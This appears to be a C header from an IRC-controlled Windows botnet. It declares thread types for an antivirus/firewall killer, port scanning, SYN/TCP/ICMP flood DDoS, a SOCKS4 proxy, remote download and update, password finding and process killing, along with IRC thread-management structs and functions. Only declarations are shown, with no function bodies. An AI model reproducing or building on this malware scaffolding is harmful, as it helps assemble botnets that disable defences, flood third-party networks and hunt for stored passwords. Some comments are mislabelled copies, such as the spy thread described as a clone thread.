enum {
	MAIN_THREAD,		// Main thread 
	KILLER_THREAD,		// Firewall/AV Killer thread
	TFTP_THREAD,		// TFTP Server thread
	FTP_THREAD,		// FTP Server thread
	SCAN_THREAD,		// Port Scanner thread
	DDOS_THREAD,		// DDoS thread
	SYN_THREAD,		// Syn Flood thread
	SPYSYN_THREAD,		// Syn Flood thread
	TCP_THREAD,		// Tcp Flood thread
	ICMP_THREAD,		// ICMP Flood thread
	REDIRECT_THREAD,	// Port Redirect thread
	SOCKS4_THREAD,		// SOCKS4 thread
	DOWNLOAD_THREAD,	// Download thread
	UPDATE_THREAD,		// Update thread
	CLONE_THREAD,		// Clone thread
	SPY_THREAD,		// Clone thread
	SECURE_THREAD,		// Secure thread
	FIND_THREAD,		// File find thread
	PASS_THREAD,		// Find pass thread
	PROC_THREAD,		// Process list thread
	LIST_THREAD,		// Threads list thread
};

typedef struct THREAD 
{
   char name[IRCLINE];
   int id; 
   int parent;
   DWORD pid;
   SOCKET sock;
   SOCKET csock;
   HANDLE tHandle;
   char nick[MAXNICKLEN];

} THREAD;

typedef struct TLIST
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	BOOL full;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} TLIST;

//threads.h
int addthread(char *name, int id, SOCKET sock);
DWORD WINAPI ListThread(LPVOID param);
void listthreads(SOCKET sock, char *chan, BOOL notice, BOOL full=FALSE);
BOOL killthread(int threadnum);
int killthreadall(void);
int killthreadid(int threadid, int threadnum=0);
int findthreadid(int threadid);
int findthreadnum(int threadid);
void stopthread(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *name, char *desc, int threadid, char *thread);
void clearthread(int threadnum);
int killProcess(int pid);